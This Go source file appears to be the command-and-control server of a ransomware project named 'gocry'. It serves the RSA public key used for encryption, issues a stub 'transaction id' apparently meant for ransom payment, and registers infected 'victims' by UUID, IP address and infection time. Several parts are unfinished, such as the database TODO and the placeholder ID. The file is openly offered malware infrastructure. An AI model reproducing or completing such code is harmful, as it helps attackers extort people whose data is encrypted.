package server

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
)

func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("your transaction id"))
}

func GetRSAPubKey(w http.ResponseWriter, r *http.Request) {
	data, err := ioutil.ReadFile("~/go/src/github.com/nireo/gocry/public.key")
	if err != nil {
		http.Error(w, fmt.Sprintf("could not get rsa public key: %s", err),
			http.StatusInternalServerError)
	}

	w.Write(data)
}

type newVictim struct {
	UUID      string `json:"uuid"` // A unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
}

func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	var victimData newVictim
	if err := json.NewDecoder(r.Body).Decode(&victimData); err != nil {
		http.Error(w, fmt.Sprintf("could not parse request body json data: %s", err),
			http.StatusInternalServerError)
		return
	}

	// TODO: store victim data in a database.
	fmt.Println(victimData.IP)
	fmt.Println(victimData.UUID)
	fmt.Println(victimData.Timestamp)

	w.WriteHeader(http.StatusOK)
}

func main() {
	http.HandleFunc("/get_transaction", GiveTransactionID)
	http.HandleFunc("/pubkey", GetRSAPubKey)
	http.HandleFunc("/register", RegisterNewVictim)

	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
		log.Fatalf("error while running listenandserver: %s", err.Error())
	}
}
